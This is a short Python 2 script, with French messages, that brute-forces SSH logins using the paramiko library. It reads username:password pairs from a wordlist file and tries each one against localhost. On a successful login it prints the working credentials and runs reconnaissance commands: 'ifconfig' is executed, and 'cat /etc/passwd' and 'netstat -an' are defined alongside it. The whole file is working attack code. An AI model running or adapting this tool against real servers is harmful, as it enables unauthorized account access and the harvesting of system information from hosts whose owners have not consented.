import paramiko
import sys

cmd1='ifconfig'
cmd2='cat /etc/passwd'
cmd3='netstat -an'

dict=open(sys.argv[1], "r")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for line in dict.readlines():
    user_pass=line.strip().split(':')
    try:
        ssh.connect('localhost', username=user_pass[0], password=user_pass[1])
    except paramiko.AuthenticationException:
        print '[0] username ou password incorrecte'
    else:
        print '[1] mot de passe correcte: usersame %s et password %s'%(user_pass[0],user_pass[1])
        stdin,stdout,stderr=ssh.exec_command(cmd1)
        for line in stdout.readlines():
            print  line.strip()
        break

ssh.close()
